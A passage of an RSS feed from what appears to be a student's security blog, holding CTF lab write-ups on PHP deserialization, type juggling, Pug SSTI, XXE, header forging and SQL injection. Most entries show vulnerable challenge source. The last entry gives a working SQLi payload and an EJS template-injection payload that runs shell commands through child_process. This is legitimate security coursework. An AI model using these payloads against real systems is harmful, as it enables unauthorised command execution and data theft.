&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
 Simple Web 0x19(Lab - PHP Login)
 &lt;a class="anchor" href="#simple-web-0x19lab---php-login">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8081">http://h4ck3r.quest:8081&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
// BSides Ahmedabad CTF 2021: entrance

include &amp;#39;flag.php&amp;#39;;
$users = array(
 &amp;#34;admin&amp;#34; =&amp;gt; &amp;#34;ed2b7b57b3b5be3e8d4246c69e4b513608ffb352&amp;#34;,
 &amp;#34;guest&amp;#34; =&amp;gt; &amp;#34;35675e68f4b5af7b995d9205ad0fc43842f16450&amp;#34;
);

function lookup($username) {
 global $users;
 return array_key_exists($username, $users) ? $users[$username] : &amp;#34;&amp;#34;;
}

if (!empty($_POST[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; !empty($_POST[&amp;#39;password&amp;#39;])) {
 $sha1pass = lookup($_POST[&amp;#39;username&amp;#39;]);
 if ($sha1pass == sha1($_POST[&amp;#39;password&amp;#39;])) {
 if ($_POST[&amp;#39;username&amp;#39;] !== &amp;#39;guest&amp;#39;) echo $FLAG;
 else echo &amp;#39;Welcome guest!&amp;#39;;
 } else {
 echo &amp;#39;Login Failed!&amp;#39;;
 }
} else {
 echo &amp;#34;You can login with guest:guest&amp;#34;;
}
echo &amp;#34;&amp;lt;br&amp;gt;\n&amp;#34;;
highlight_file(__file__);
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
 Simple Web 0x22(Lab - Pug)
 &lt;a class="anchor" href="#simple-web-0x22lab---pug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8008">http://h4ck3r.quest:8008&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const pug = require(&amp;#39;pug&amp;#39;);

const app = express();

const template = `
h1 Hello %NAME%
form(method=&amp;#39;GET&amp;#39; action=&amp;#39;/&amp;#39;)
 div
 label(for=&amp;#39;nickname&amp;#39;) Name:
 input#nickname(type=&amp;#39;text&amp;#39;, placeholder=&amp;#39;Nickname&amp;#39; name=&amp;#39;name&amp;#39;)
 button(type=&amp;#39;submit&amp;#39;) Submit 
 a(href=&amp;#39;/source&amp;#39;) Source Code
`;

app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const name = (req.query.name ?? &amp;#39;Anonymous&amp;#39;).toString();
 if (name.includes(&amp;#39;{&amp;#39;)) return res.send(&amp;#39;Nice try&amp;#39;);
 let html = pug.render(template.replace(&amp;#39;%NAME%&amp;#39;, name));
 res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/html&amp;#39;);
 res.send(html);
});

app.get(&amp;#34;/source&amp;#34;, (_, res) =&amp;gt; {
 res.sendFile(__filename);
});

app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
 Simple Web 0x24(Lab - how2http)
 &lt;a class="anchor" href="#simple-web-0x24lab---how2http">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">include&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;flag.php&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">elseif&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($_COOKIE[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Not admim&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>( $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REQUEST_METHOD&amp;#34;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;FLAG&amp;#34;&lt;/span> ) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;u don&amp;#39;t need flag?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($ip &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">echo&lt;/span> $FLAG;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;NOPE!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>主要是參考之前寫過的&lt;a href="https://hackmd.io/@SBK6401/B135SD0w2">PicoCTF - Who are you?&lt;/a>和&lt;a href="https://hackmd.io/@SBK6401/Syct_Ol0i#Challenge-picobrowser%F0%9F%8D%B0">PicoCTF - Who are you?&lt;/a>，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
 Simple Web 0x41(2023 HW - Double Injection - FLAG1)
 &lt;a class="anchor" href="#simple-web-0x412023-hw---double-injection---flag1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Time Based SQLi
:::info
建議先在local side自架docker environment，debug比較方便；另外也推薦在local自架sqlite的環境，下語法或是debug也很方便
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler init-db.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;fs&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;sqlite3&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">verbose&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">FLAG1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">readFileSync&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/flag1.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;utf8&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">trim&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">sqlite3&lt;/span>.&lt;span style="color:#a6e22e">Database&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/etc/db.sqlite3&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">db&lt;/span>.&lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">DROP TABLE IF EXISTS users;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">CREATE TABLE db (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> users JSON NOT NULL
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">INSERT INTO db(users) VALUES (&amp;#39;{
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;admin&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;admin&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>&lt;span style="color:#a6e22e">FLAG1&lt;/span>&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> },
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;guest&amp;#34;: {
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;username&amp;#34;: &amp;#34;guest&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;#34;password&amp;#34;: &amp;#34;guest&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> }
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">}&amp;#39;);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">`&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
 Simple Web 0x42(2023 HW - Double Injection - FLAG2)
 &lt;a class="anchor" href="#simple-web-0x422023-hw---double-injection---flag2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Node JS ejs SSTI&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
&lt;img src="https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png" alt="" />
基本上就是連接前一題的思緒，既然我們知道admin的password也就是FLAG1，那麼我們就可以用前一題的payload:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- #
&lt;/code>&lt;/pre>&lt;p>後面搭配簡單的XSS也是可以通的，原本想說可以利用XSS達到RCE，但就我之前和Kaibro的詢問，XSS應該沒有這麼powerful，所以我就往SSTI或command injection下手，後來經過@cs-otaku的提點才知道ejs有一個洞，也是上課有提到的SSTI控到RCE，當時看的文章是Huli大寫的，內容詳細說明了為甚麼會有這個洞以及該如何構造攻擊的payload，不過整體更複雜也算是需要客製化的題目才需要了解這麼多，這一題算是只要取得經典的payload就可以攻克，如果想要用動態看他跑得怎麼樣，可以用web storm跟，想知道整體的動態流程可以看&lt;a href="https://hackmd.io/@SBK6401/HkgkDNsPp">之前寫的文章&lt;/a>&lt;/p>
&lt;h2 id="exploit---ejs-ssti-rce">
 Exploit - Ejs SSTI RCE
 &lt;a class="anchor" href="#exploit---ejs-ssti-rce">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload 1:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;ls -al /&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result:
